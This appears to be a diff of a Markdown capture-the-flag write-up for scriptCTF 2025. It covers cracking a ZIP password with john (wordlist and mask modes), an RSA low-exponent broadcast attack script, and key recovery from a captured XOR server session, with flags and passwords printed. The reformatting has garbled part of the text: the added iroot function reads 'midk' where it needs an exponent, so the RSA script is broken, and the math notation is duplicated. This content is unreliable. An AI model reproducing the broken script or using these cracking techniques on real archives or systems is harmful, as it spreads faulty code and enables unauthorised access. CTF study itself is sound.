 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado**$ zip2john **justsomezip.zip** **\>** hash.txt
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ zip2john justsomezip.zip > hash.txt
 
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado**$ john \--format=PKZIP **hash.txt** \--wordlist=/usr/share/wordlists/rockyou.txt  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado$ john --format=PKZIP hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
 
 Using default input encoding: UTF-8  
-Loaded 1 password hash (PKZIP \[32/64\])  
+Loaded 1 password hash (PKZIP [32/64])  
 Will run 4 OpenMP threads  
 Press 'q' or Ctrl-C to abort, almost any other key for status  
 impassive3428    (justsomezip.zip)        
 1g 0:00:00:01 DONE (2025-08-17 17:16) 0.7633g/s 5609Kp/s 5609Kc/s 5609KC/s in4nd0keren..imissdesi  
 Use the "--show" option to display all of the cracked passwords reliably  
 Session completed.  
-\`\`\`  
-After a few seconds, the password is revealed to be \`impassive3428\`. Inside the zip were two files  with the same name as before  
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip**$ tree  
-**.**  
-├── **justsomezip.zip**  
+```  
+After a few seconds, the password is revealed to be `impassive3428`. Inside the zip were two files  with the same name as before  
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip$ tree  
+.  
+├── justsomezip.zip  
 └── staticnoise.wav
 
 1 directory, 2 files
 
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip**$ file **\***             
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip$ file *             
 justsomezip.zip: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Jun 24 2025 19:12:42, uncompressed size 28, method=store  
 staticnoise.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 22050 Hz  
-\`\`\`
+```
 
 I tried brute-forcing the password again, but there were no positive results, so I shifted my focus onto the WAV file. Running exiftool on it showed a telling comment. The password couldn't be brute-forced
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip**$ exiftool **staticnoise.wav**    
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip$ exiftool staticnoise.wav    
 ExifTool Version Number         : 13.25  
 File Name                       : staticnoise.wav  
 Directory                       : .  
@@ -556,7 +554,7 @@ File Size                       : 438 kB
 File Modification Date/Time     : 2025:06:25 13:38:40+03:00  
 File Access Date/Time           : 2025:08:17 17:18:23+03:00  
 File Inode Change Date/Time     : 2025:08:17 17:18:17+03:00  
-File Permissions                : \-rw-r--r--  
+File Permissions                : -rw-r--r--  
 File Type                       : WAV  
 File Type Extension             : wav  
 MIME Type                       : audio/x-wav  
@@ -569,7 +567,7 @@ Comment                         : What if my password isn't on rockyou.txt
 Software                        : Lavf61.7.100  
 Duration                        : 4.96 s  
                                             
-\`\`\`
+```
 
 I opened the file in Sonic Visualizer and applied a spectrogram view. Here is what shows  
 ![][image11]
@@ -578,22 +576,22 @@ It looks like some embedded text, but it's clipped. I redid the same process in 
 
 ![][image12]
 
-I can make out the first three characters, d41, and the fifth \`3\`. We can use John's mask mode to generate the possible combinations.
+I can make out the first three characters, d41, and the fifth `3`. We can use John's mask mode to generate the possible combinations.
 
-\`\`  
-john \--mask='d41?1?1?1?1?1' \--1='?l?d' \--format=PKZIP hash.txt  
-\`\`\`
+```zsh  
+john --mask='d41?1?1?1?1?1' --1='?l?d' --format=PKZIP hash.txt  
+```
 
-* d41 \= known prefix  
-* ?1?1?1?1?1 \= 5 unknown characters  
-* \--1='?l?d' \= defines ?1 as “lowercase letters or digits”  
-* \--format=PKZIP \= tells John it’s a ZIP hash
+* d41 = known prefix  
+* ?1?1?1?1?1 = 5 unknown characters  
+* --1='?l?d' = defines ?1 as “lowercase letters or digits”  
+* --format=PKZIP = tells John it’s a ZIP hash
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip**$ john \--mask='d41?1?1?1?1?1' \--1='?l?d' \--format=PKZIP **hash.txt**
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip$ john --mask='d41?1?1?1?1?1' --1='?l?d' --format=PKZIP hash.txt
 
 Using default input encoding: UTF-8  
-Loaded 1 password hash (PKZIP \[32/64\])  
+Loaded 1 password hash (PKZIP [32/64])  
 Will run 4 OpenMP threads  
 Press 'q' or Ctrl-C to abort, almost any other key for status  
 d41v3ron         (justsomezip.zip/flag.txt)        
@@ -601,59 +599,59 @@ d41v3ron         (justsomezip.zip/flag.txt)
 Use the "--show" option to display all of the cracked passwords reliably  
 Session completed.    
                                                                                                                                                                                                                  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip**$ unzip **justsomezip.zip**    
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip$ unzip justsomezip.zip    
 Archive:  justsomezip.zip  
-\[justsomezip.zip\] flag.txt password:    
+[justsomezip.zip] flag.txt password:    
 extracting: flag.txt                   
                                                                                                                                                                                                                  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip**$ cat **flag.txt**             
-scriptCTF{1\_l0ve\_d41\_v3r0n}  
-\`\`\`
+mockingspectre@kali:~/ctf/scriptctf2025/forensics/justsome-avocado/justsomezip$ cat flag.txt             
+scriptCTF{1_l0ve_d41_v3r0n}  
+```
 
-Flag: \`scriptCTF{1\_l0ve\_d41\_v3r0n}\`
+Flag: `scriptCTF{1_l0ve_d41_v3r0n}`
 
 # Challenge: RSA-1
 
 ![][image13]
 
 The attachment out.txt has  
-\`\`\`  
-out.txt has: n1 \= 156503881374173899106040027210320626006530930815116631795516553916547375688556673985142242828597628615920973708595994675661662789752600109906259326160805121029243681236938272723595463141696217880136400102526509149966767717309801293569923237158596968679754520209177602882862180528522927242280121868961697240587 c1 \= 77845730447898247683281609913423107803974192483879771538601656664815266655476695261695401337124553851404038028413156487834500306455909128563474382527072827288203275942719998719612346322196694263967769165807133288612193509523277795556658877046100866328789163922952483990512216199556692553605487824176112568965 n2 \= 81176790394812943895417667822424503891538103661290067749746811244149927293880771403600643202454602366489650358459283710738177024118857784526124643798095463427793912529729517724613501628957072457149015941596656959113353794192041220905793823162933257702459236541137457227898063370534472564804125139395000655909 c2 \= 40787486105407063933087059717827107329565540104154871338902977389136976706405321232356479461501507502072366720712449240185342528262578445532244098369654742284814175079411915848114327880144883620517336793165329893295685773515696260299308407612535992098605156822281687718904414533480149775329948085800726089284 n3 \= 140612513823906625290578950857303904693579488575072876654320011261621692347864140784716666929156719735696270348892475443744858844360080415632704363751274666498790051438616664967359811895773995052063222050631573888071188619609300034534118393135291537302821893141204544943440866238800133993600817014789308510399 c3 \= 100744134973371882529524399965586539315832009564780881084353677824875367744381226140488591354751113977457961062275480984708865578896869353244823264759044617432862876208706282555040444253921290103354489356742706959370396360754029015494871561563778937571686573716714202098622688982817598258563381656498389039630 e \= 3  
-\`\`\`
+```txt  
+out.txt has: n1 = 156503881374173899106040027210320626006530930815116631795516553916547375688556673985142242828597628615920973708595994675661662789752600109906259326160805121029243681236938272723595463141696217880136400102526509149966767717309801293569923237158596968679754520209177602882862180528522927242280121868961697240587 c1 = 77845730447898247683281609913423107803974192483879771538601656664815266655476695261695401337124553851404038028413156487834500306455909128563474382527072827288203275942719998719612346322196694263967769165807133288612193509523277795556658877046100866328789163922952483990512216199556692553605487824176112568965 n2 = 81176790394812943895417667822424503891538103661290067749746811244149927293880771403600643202454602366489650358459283710738177024118857784526124643798095463427793912529729517724613501628957072457149015941596656959113353794192041220905793823162933257702459236541137457227898063370534472564804125139395000655909 c2 = 40787486105407063933087059717827107329565540104154871338902977389136976706405321232356479461501507502072366720712449240185342528262578445532244098369654742284814175079411915848114327880144883620517336793165329893295685773515696260299308407612535992098605156822281687718904414533480149775329948085800726089284 n3 = 140612513823906625290578950857303904693579488575072876654320011261621692347864140784716666929156719735696270348892475443744858844360080415632704363751274666498790051438616664967359811895773995052063222050631573888071188619609300034534118393135291537302821893141204544943440866238800133993600817014789308510399 c3 = 100744134973371882529524399965586539315832009564780881084353677824875367744381226140488591354751113977457961062275480984708865578896869353244823264759044617432862876208706282555040444253921290103354489356742706959370396360754029015494871561563778937571686573716714202098622688982817598258563381656498389039630 e = 3  
+```
 
- this is the classic low-exponent (e \= 3\) broadcast attack. To crack it:
+ this is the classic low-exponent (e = 3) broadcast attack. To crack it:
 
-1. Use the three ciphertexts c1,c2,c3c\_1,c\_2,c\_3c1​,c2​,c3​ and moduli n1,n2,n3n\_1,n\_2,n\_3n1​,n2​,n3​.
+1. Use the three ciphertexts c1,c2,c3c_1,c_2,c_3c1​,c2​,c3​ and moduli n1,n2,n3n_1,n_2,n_3n1​,n2​,n3​.
 
-2. Combine them with the Chinese Remainder Theorem to reconstruct M=m3 mod NM \= m^3 \\bmod NM=m3modN where N=n1n2n3N \= n\_1 n\_2 n\_3N=n1​n2​n3​. Because the original message mmm is smaller than each modulus and m3\<Nm^3 \< Nm3\<N, CRT yields the actual integer m3m^3m3.
+2. Combine them with the Chinese Remainder Theorem to reconstruct M=m3 mod NM = m^3 bmod NM=m3modN where N=n1n2n3N = n_1 n_2 n_3N=n1​n2​n3​. Because the original message mmm is smaller than each modulus and m3<Nm^3 < Nm3<N, CRT yields the actual integer m3m^3m3.
 
 3. Take the integer cube root of MMM to get mmm.
 
-4. Decode mmm to bytes — the result contained PKCS\#7-style padding (0x12 repeated), so stripping that reveals the flag.
+4. Decode mmm to bytes — the result contained PKCS#7-style padding (0x12 repeated), so stripping that reveals the flag.
 
 This calls  for the good old Python script:
 
-\`\`\`  
+```python  
 def egcd(a,b):  
-    if b \== 0:  
+    if b == 0:  
         return (1, 0, a)  
-    x,y,g \= egcd(b, a % b)  
-    return (y, x \- (a // b) \* y, g)
+    x,y,g = egcd(b, a % b)  
+    return (y, x - (a // b) * y, g)
 
 def invmod(a,m):  
-    x,y,g \= egcd(a,m)  
-    if g \!= 1:  
+    x,y,g = egcd(a,m)  
+    if g != 1:  
         raise Exception("no inverse")  
     return x % m
 
 def iroot(k, n):  
-    low, high \= 0, 1 \<\< ((n.bit\_length()+k-1)//k \+ 1\)  
-    while low \< high:  
-        mid \= (low+high)//2  
-        if mid\*\*k \< n:  
-            low \= mid+1  
+    low, high = 0, 1 << ((n.bit_length()+k-1)//k + 1)  
+    while low < high:  
+        mid = (low+high)//2  
+        if midk < n:  
+            low = mid+1  
         else:  
-            high \= mid  
+            high = mid  
     return low-1
 
 n1=156503881374173899106040027210320626006530930815116631795516553916547375688556673985142242828597628615920973708595994675661662789752600109906259326160805121029243681236938272723595463141696217880136400102526509149966767717309801293569923237158596968679754520209177602882862180528522927242280121868961697240587
@@ -668,83 +666,84 @@ n3=14061251382390662529057895085730390469357948857507287665432001126162169234786
 
 c3=100744134973371882529524399965586539315832009564780881084353677824875367744381226140488591354751113977457961062275480984708865578896869353244823264759044617432862876208706282555040444253921290103354489356742706959370396360754029015494871561563778937571686573716714202098622688982817598258563381656498389039630
 
-e \= 3
+e = 3
 
-\# CRT combine  
-N \= n1 \* n2 \* n3  
-m1 \= N // n1  
-m2 \= N // n2  
-m3 \= N // n3  
-C \= (m1\*invmod(m1,n1)\*c1 \+ m2\*invmod(m2,n2)\*c2 \+ m3\*invmod(m3,n3)\*c3) % N
+# CRT combine  
+N = n1 * n2 * n3  
+m1 = N // n1  
+m2 = N // n2  
+m3 = N // n3  
+C = (m1*invmod(m1,n1)*c1 + m2*invmod(m2,n2)*c2 + m3*invmod(m3,n3)*c3) % N
 
-\# integer cube root  
-m \= iroot(e, C)  
-mb \= m.to\_bytes((m.bit\_length()+7)//8, 'big')
+# integer cube root  
+m = iroot(e, C)  
+mb = m.to_bytes((m.bit_length()+7)//8, 'big')
 
-\# strip PKCS\#7 padding  
-pad \= mb\[-1\]  
-flag \= mb\[:-pad\].decode()  
+# strip PKCS#7 padding  
+pad = mb[-1]  
+flag = mb[:-pad].decode()  
 print(flag)  
-\`\`\`
+```
 
 Running this, we get the flag:
 
-\`\`\`  
-**mockingspectre@kali**:**\~/ctf/scriptctf2025/crypto/RSA-1**$ python3 **solve.py**    
-scriptCTF{y0u\_f0und\_mr\_yu's\_s3cr3t\_m3g\_12a4e4}  
-\`\`\`
+```zsh  
+mockingspectre@kali:~/ctf/scriptctf2025/crypto/RSA-1$ python3 solve.py    
+scriptCTF{y0u_f0und_mr_yu's_s3cr3t_m3g_12a4e4}  
+```
 
-Flag: \`scriptCTF{y0u\_f0und\_mr\_yu's\_s3cr3t\_m3g\_12a4e4}\`
+Flag: `scriptCTF{y0u_f0und_mr_yu's_s3cr3t_m3g_12a4e4}`
 
 # Challenge: Secure-Server
 
 ![][image14]
 
 The provided files are a network capture(pcap) and a Python file. The contents of the Python file are  
-\`\`\`  
+```python  
 import os  
 from pwn import xor  
-print("With the Secure Server, sharing secrets is safer than ever\!")  
-enc \= bytes.fromhex(input("Enter the secret, XORed by your key (in hex): ").strip())  
-key \= os.urandom(32)  
-enc2 \= xor(enc,key).hex()  
+print("With the Secure Server, sharing secrets is safer than ever!")  
+enc = bytes.fromhex(input("Enter the secret, XORed by your key (in hex): ").strip())  
+key = os.urandom(32)  
+enc2 = xor(enc,key).hex()  
 print(f"Double encrypted secret (in hex): {enc2}")  
-dec \= bytes.fromhex(input("XOR the above with your key again (in hex): ").strip())  
-secret \= xor(dec,key)  
-print("Secret received\!")  
-\`\`\`
+dec = bytes.fromhex(input("XOR the above with your key again (in hex): ").strip())  
+secret = xor(dec,key)  
+print("Secret received!")  
+```
 
 Opening the pcap file in Wireshark, we get some TCP streams that we follow and see.
 
 ![][image15]
 
 To decrypt it  
-\`\`\`  
+```python  
 from binascii import unhexlify
 
-def xor\_bytes(a, b):  
+def xor_bytes(a, b):  
     return bytes(x ^ y for x, y in zip(a, b))
 
-\# Variables from the captured session  
-enc \= bytes.fromhex("151e71ce4addf692d5bac83bb87911a20c39b71da3fa5e7ff05a2b2b0a83ba03")  
-enc2 \= bytes.fromhex("e1930164280e44386b389f7e3bc02b707188ea70d9617e3ced989f15d8a10d70")  
-dec \= bytes.fromhex("87ee02c312a7f1fef8f92f75f1e60ba122df321925e8132068b0871ff303960e")
+# Variables from the captured session  
+enc = bytes.fromhex("151e71ce4addf692d5bac83bb87911a20c39b71da3fa5e7ff05a2b2b0a83ba03")  
+enc2 = bytes.fromhex("e1930164280e44386b389f7e3bc02b707188ea70d9617e3ced989f15d8a10d70")  
+dec = bytes.fromhex("87ee02c312a7f1fef8f92f75f1e60ba122df321925e8132068b0871ff303960e")
 
-\# Recover the key  
-key \= xor\_bytes(enc, enc2)
+# Recover the key  
+key = xor_bytes(enc, enc2)
 
-\# Recover the secret  
-secret \= xor\_bytes(dec, key)
+# Recover the secret  
+secret = xor_bytes(dec, key)
 
 print("Recovered key:", key.hex())  
 print("Recovered secret:", secret.decode())  
-\`\`\`  
+```  
 Running this, we get the flag in plaintext.
 
-\`\`\`**mockingspectre@kali**:**\~/ctf/scriptctf2025/crypto/Secure-Server**$ python3 **solve.py**    
+```zsh
+mockingspectre@kali:~/ctf/scriptctf2025/crypto/Secure-Server$ python3 solve.py    
 Recovered key: f48d70aa62d3b2aabe82574583b93ad27db15d6d7a9b20431dc2b43ed222b773  
-Recovered secret: scriptCTF{x0r\_1s\_not\_s3cur3\!\!\!\!}  
-\`\`\`  
+Recovered secret: scriptCTF{x0r_1s_not_s3cur3!!!!}  
+```  
 The server prints `enc2` (which leaks `enc XOR key`) while also sending/receiving the original `enc` and the follow-up `dec`. With both `enc` and `enc2,` an eavesdropper can derive the session key (`enc XOR enc2`) and then decrypt whatever the client sends later (`dec XOR key`) — so the server ends up leaking secrets it was supposed to protect.  
 Flag: `scriptCTF{x0r_1s_not_s3cur3!!!!}`
 
